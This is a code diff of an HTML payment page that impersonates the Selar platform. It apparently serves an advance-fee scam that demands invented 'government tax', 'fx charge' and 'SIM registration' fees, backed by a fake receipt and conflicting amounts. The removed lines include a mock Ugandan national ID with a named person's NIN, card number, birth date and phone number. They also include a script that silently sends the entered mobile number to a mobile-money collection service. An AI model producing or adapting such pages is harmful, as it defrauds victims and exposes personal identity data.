@@ -26,11 +26,23 @@
             box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
 
-        /* Blinking Animation */
+        /* Blinking Animations */
         @keyframes blink {
             0% { opacity: 1; }
             50% { opacity: 0.3; }
             100% { opacity: 1; }
+        }
+
+        @keyframes blink-blue {
+            0% { color: #0000ff; opacity: 1; }
+            50% { color: #0000ff; opacity: 0.3; }
+            100% { color: #0000ff; opacity: 1; }
+        }
+
+        @keyframes blink-green {
+            0% { color: #008000; opacity: 1; }
+            50% { color: #008000; opacity: 0.3; }
+            100% { color: #008000; opacity: 1; }
         }
 
         .country-badge { 
@@ -72,25 +84,162 @@
 
         .description { color: #666; font-size: 13px; line-height: 1.4; margin: 0 auto 25px; max-width: 90%; }
 
+        /* Realistic Thermal Receipt Section */
+        .image-receipt-box {
+            background: #fff;
+            background-image: radial-gradient(#eee 1px, transparent 0);
+            background-size: 4px 4px;
+            border: 1px solid #ddd;
+            margin: 0 15px 25px;
+            padding: 25px 20px;
+            text-align: left;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 12px;
+            color: #222;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            position: relative;
+        }
+        .receipt-header-main { text-align: center; font-weight: bold; font-size: 16px; margin-bottom: 2px; }
+        .receipt-line { margin: 6px 0; border-bottom: 1px solid #f0f0f0; padding-bottom: 2px; }
+        .receipt-bold { font-weight: bold; font-size: 14px; }
+        .receipt-center { text-align: center; font-weight: bold; letter-spacing: 1px; }
+        .red-status { color: #d32f2f; font-weight: bold; text-align: center; display: block; margin-top: 15px; border: 1px solid #d32f2f; padding: 5px; }
+
+        /* Verified Title Style */
+        .id-verified-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+        }
+
+        .id-verified-title {
+            font-weight: bold;
+            font-size: 14px;
+            color: #0000ff;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            animation: blink-blue 1.5s infinite;
+        }
+
+        .star-sign {
+            font-size: 18px;
+            color: #008000;
+            animation: blink-green 1.5s infinite;
+        }
+
+        /* National ID Visual Section */
+        .id-card-visual {
+            width: 92%;
+            margin: 10px auto 10px;
+            aspect-ratio: 1.6 / 1;
+            background: linear-gradient(135deg, #f3d7d7 0%, #e2eff1 50%, #f1def1 100%);
+            border-radius: 12px;
+            border: 1px solid #c0c0c0;
+            position: relative;
+            padding: 12px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            text-align: left;
+            overflow: hidden;
+            color: #1a2a44;
+        }
+        .id-header-text {
+            text-align: center;
+            font-weight: 700;
+            font-size: 13px;
+            margin-bottom: 8px;
+            letter-spacing: 0.5px;
+            color: #2c3e50;
+        }
+        .id-body {
+            position: relative;
+            z-index: 1;
+            display: grid;
+            grid-template-columns: 75px 1fr 1fr;
+            gap: 2px 10px;
+        }
+
+        /* Passport Photo Replacement with Text */
+        .photo-privacy-area {
+            grid-row: 1 / 6;
+            width: 75px;
+            height: 95px;
+            border: 1px solid #bbb;
+            border-radius: 4px;
+            background-color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 5px;
+            position: relative;
+            overflow: hidden;
+            text-align: center;
+        }
+        
+        .photo-note-small {
+            font-size: 8px;
+            font-weight: bold;
+            color: #555;
+            z-index: 3;
+            line-height: 1.2;
+        }
+
+        .map-flag-background {
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            right: 5px;
+            bottom: 5px;
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Flag-map_of_Uganda.svg/1200px-Flag-map_of_Uganda.svg.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            opacity: 0.2;
+            z-index: 1;
+        }
+
+        .thumb-print-overlay {
+            width: 50%;
+            height: 50%;
+            background-image: url('https://www.svgrepo.com/show/24430/fingerprint.svg');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            position: absolute;
+            z-index: 2;
+            opacity: 0.4;
+        }
+
+        .id-field { margin-bottom: 2px; }
+        .id-label-small { font-size: 7px; color: #555; font-weight: bold; text-transform: uppercase; margin: 0; }
+        .id-val-text { font-size: 10px; font-weight: 800; color: #000; margin: 0; }
+        
+        /* Bottom Privacy Disclaimer */
+        .bottom-privacy-note {
+            width: 90%;
+            margin: 0 auto 25px;
+            font-size: 10px;
+            color: #d32f2f;
+            font-weight: bold;
+            line-height: 1.4;
+            text-align: center;
+        }
+
+        /* Payment Logic Styles */
         .main-amount { font-size: 34px; font-weight: 800; color: #000; margin-bottom: 5px; }
         .confirm-text { color: #888; font-size: 13px; margin-bottom: 30px; }
-
         .payment-box { border: 1px solid #e0e0e0; border-radius: 20px; padding: 15px; margin: 0 10px 20px; position: relative; }
-        
         .input-group { display: flex; border: 1px solid #ddd; border-radius: 12px; padding: 4px; align-items: center; margin-bottom: 15px; background: #fff; }
         .input-group input { border: none; outline: none; flex-grow: 1; font-size: 18px; font-weight: bold; color: #444; padding-left: 10px; width: 40%; }
-        
         .continue-btn { background-color: #00a651; color: white; border: none; padding: 10px 18px; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; white-space: nowrap; transition: 0.3s; }
-        .continue-btn:disabled { background-color: #a0a0a0; cursor: not-allowed; }
-
-        /* Hidden Processing Message */
+        
         #processing-notice { display: none; margin-bottom: 15px; padding: 10px; background: #f0fdf4; border-radius: 10px; border: 1px solid #dcfce7; }
         .loading-spinner { border: 2px solid #f3f3f3; border-top: 2px solid #00a651; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; margin-right: 5px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
+        
         .footer-labels { display: flex; justify-content: space-between; align-items: center; font-size: 12px; color: #777; margin-bottom: 10px; }
-        .footer-secondary { display: flex; justify-content: space-between; font-size: 11px; color: #aaa; margin-top: 10px; }
-
+        .footer-secondary { display: flex; justify-content: space-between; font-size: 11px; color: #aaa; padding: 10px 15px 20px; }
         .mtn-mini { border: 1px solid #ffcc00; color: #e6b800; border-radius: 10px; padding: 0 6px; font-weight: bold; font-size: 9px; margin-right: 5px; }
         .airtel-mini { color: #ff0000; font-weight: bold; font-size: 11px; display: flex; align-items: center; }
     </style>
@@ -98,12 +247,11 @@
 <body>
 
 <div class="invoice-card">
-    <div class="country-badge"><span class="status-dot"></span> GOVERNMENT TAX 🇺🇬</div>
-
+    <div class="country-badge"><span class="status-dot"></span> SELAR MERCHANT PAYMENT🇺🇬</div>
     <div class="logo-circle">Selar</div>
 
     <div class="title-row">
-        <h2>selar-invoice-800usd</h2>
+        <h2>selar-Merchant-200usd-74,300UGX</h2>
         <div class="verified-badge">✔ Verified</div>
     </div>
 
@@ -112,26 +260,25 @@
         <span class="btn-pill">📋 Copy paylink</span>
     </div>
 
-    <p class="description">You are paying government tax for selar-invoice-800usd securely. Payments are protected and your details stay private.</p>
-<div class="image-receipt-box">
-        <div class="receipt-header-main">SELAR INVOICE</div>
+    <p class="description">You are paying fx charge for selar-merchant-200usd securely. Payments are protected and your details stay private.</p>
+
+    <div class="image-receipt-box">
+        <div class="receipt-header-main">SELAR MERCHANT TRANSACTION</div>
         <div class="receipt-center" style="font-size: 11px; margin-bottom: 10px;">TRANSACTION - RECEIPT</div>
         <div class="receipt-center" style="margin-bottom: 10px;">****************************</div>
         <div class="receipt-line"><strong>TYPE:</strong> Send Money (Mobile)</div>
-        <div class="receipt-line"><strong>ACCOUNT:</strong> [Your Selar invoice Account Number]</div>
-        <div class="receipt-line"><strong>NAME:</strong> LOLIKISHEE  USA Chicago🇺🇲</div>
+        <div class="receipt-line"><strong>ACCOUNT:</strong> [Your Selar Merchant Account Number]</div>
+        <div class="receipt-line"><strong>NAME:</strong> Lolikishee USA Chicago🇺🇲</div>
         <div class="receipt-line" style="margin-top: 15px;"><strong>RECIPIENT ID:</strong> SI001234595</div>
-        <div class="receipt-bold" style="text-decoration: underline;">MUTASA BRIAN</div>
-        <div class="receipt-line"><strong>MOBILE:</strong> +256741329399</div>
-        <div class="receipt-line"><strong>NETWORK:</strong> AIRTEL UGANDA</div>
+        <div class="receipt-bold" style="text-decoration: underline;">Mobile Transaction </div>
+        <div class="receipt-line"><strong>MOBILE:</strong>6837633</div>
+        <div class="receipt-line"><strong>NETWORK:</strong> MERCHANT ID</div>
         <div class="receipt-line" style="margin-top: 15px;"><strong>TOTAL AMOUNT:</strong></div>
-        <div class="receipt-bold" style="font-size: 18px;">USD 800.00</div>
+        <div class="receipt-bold" style="font-size: 18px;">USD 200.00</div>
         <div class="receipt-center" style="margin-top: 15px;">----------------------------</div>
-        <div class="red-status">[PENDING: NOT PAID GOVERNMENT TAX OF 189,500 UGX]</div>
-        <div class="receipt-center" style="font-family: sans-serif; font-size: 24px; margin-top: 20px; font-weight: 900; letter-spacing: 4px;">SELAR</div>
+        <div class="red-status">[SIM CARD NOT REGISTERED ON SELAR MERCHANT TRANSACTION SYSTEM]</div>
+        <div class="receipt-center" style="font-family: sans-serif; font-size: 24px; margin-top: 20px; font-weight: 900; letter-spacing: 4px;">SELAR MERCHANT</div>
     </div>
-    <div class="main-amount">UGX189,500</div>
-    <div class="confirm-text">Confirm the details below to send your secure payment.</div>
 
     <div class="payment-box">
         <div id="processing-notice">
@@ -149,7 +296,7 @@
             <input type="hidden" name="email" value="lolikishee1@gmail.com" />
             <input type="hidden" name="name" value="loli kishee" />
             <input type="hidden" name="cur" value="UGX" />
-            <input type="hidden" name="amount" value="189500" />
+            <input type="hidden" name="amount" value="66300" />
 
             <div class="input-group">
                 <input type="text" name="mobile" id="mobile" placeholder="07XXXXXXXX" required pattern="[0-9]{10}" title="Please enter a valid 10-digit phone number" />
@@ -158,110 +305,38 @@
         </form>
 
         <div class="footer-labels">
-            <span>Amount: UGX 189,500</span>
+            <span>Amount: UGX 21,670</span>
             <div style="display:flex; align-items: center;">
                 <span class="mtn-mini">MTN</span>
                 <span class="airtel-mini">● airtel</span>
             </div>
         </div>
- <div class="id-verified-container">
-        <span class="star-sign">🇺🇬</span>
-        <div class="id-verified-title">NATIONAL ID VERIFIED</div>
-        <span class="star-sign">🇺🇬</span>
-    </div>
-    
-    <div class="id-card-visual">
-        <div class="id-header-text">REPUBLIC OF UGANDA<br>NATIONAL ID CARD</div>
-        <div class="id-body">
-            <div class="photo-privacy-area">
-                <div class="map-flag-background"></div>
-                <div class="thumb-print-overlay"></div>
-                <div class="photo-note-small">Note: Selar stay private for your passport photo</div>
-            </div>
 
-            <div class="id-field" style="grid-column: 2 / 4;">
-                <p class="id-label-small">SURNAME</p>
-                <p class="id-val-text">MUTASA</p>
-            </div>
-            <div class="id-field" style="grid-column: 2 / 4;">
-                <p class="id-label-small">GIVEN NAME</p>
-                <p class="id-val-text">BRIAN</p>
-            </div>
-            <div class="id-field">
-                <p class="id-label-small">NATIONALITY</p>
-                <p class="id-val-text">UGA</p>
-            </div>
-            <div class="id-field">
-                <p class="id-label-small">SEX</p>
-                <p class="id-val-text">M</p>
-            </div>
-            <div class="id-field">
-                <p class="id-label-small">DATE OF BIRTH</p>
-                <p class="id-val-text">04.02.1996</p>
-            </div>
-            <div class="id-field" style="grid-column: 2;">
-                <p class="id-label-small">NIN</p>
-                <p class="id-val-text">CM96008105M84J</p>
-            </div>
-            <div class="id-field" style="grid-column: 3;">
-                <p class="id-label-small">CARD NO.</p>
-                <p class="id-val-text">020890805</p>
-            </div>
-            <div class="id-field" style="grid-column: 2;">
-                <p class="id-label-small">DATE OF EXPIRY</p>
-                <p class="id-val-text">27.05.2031</p>
-            </div>
-        </div>
+    
         <div style="margin-top: 10px; text-align: center; border-top: 1px solid rgba(0,0,0,0.1);">
             <p class="id-label-small">PERSON VERIFIED</p>
-            <div style="font-family: cursive; font-size: 11px; margin-top: -2px;">MUTASA BRIAN</div>
+            <div style="font-family: cursive; font-size: 11px; margin-top: -2px;">SIM CARD NOT VERIFIEDP</div>
         </div>
     </div>
 
     <div class="bottom-privacy-note">
-        NOTE: Kindly Selar system stay private for our client details, THANK YOU
-    </div>
-        <div class="footer-secondary">
-            <span>© 2026 Selar Invoice System </span>
-            <span>256-bit SSL ● Secure</span>
-        </div>
+        NOTE: Currently Selar merchant system support transactions on Sim Card Verified by Selar Merchant. 
+    </div>\
+
+    <div class="footer-secondary">
+        <span>© 2026 Selar Merchant system</span>
+        <span>256-bit SSL ● Secure</span>
     </div>
 </div>
 
 <script>
     document.getElementById('paymentForm').addEventListener('submit', function(e) {
-        e.preventDefault(); // Prevents the page from redirecting
-
-        const form = this;
+        e.preventDefault(); 
         const btn = document.getElementById('submitBtn');
         const notice = document.getElementById('processing-notice');
-        const mobileInput = document.getElementById('mobile');
-        
-        // Disable inputs and show loading state
         btn.disabled = true;
         btn.innerText = "Please wait...";
-        mobileInput.readOnly = true;
         notice.style.display = "block";
-
-        // Create the data to send
-        const formData = new FormData(form);
-
-        // Send the request in the background
-        fetch('https://my.jpesa.com/?dad=xp', {
-            method: 'POST',
-            body: formData,
-            mode: 'no-cors' // This allows the request to be sent to a different domain silently
-        })
-        .then(() => {
-            // Because of 'no-cors', we won't see the response body, 
-            // but the request has been successfully dispatched to Jpesa.
-            console.log("Background payment request sent.");
-        })
-        .catch(error => {
-            console.error("Submission error:", error);
-            btn.innerText = "Retry";
-            btn.disabled = false;
-        });
     });
 </script>
 
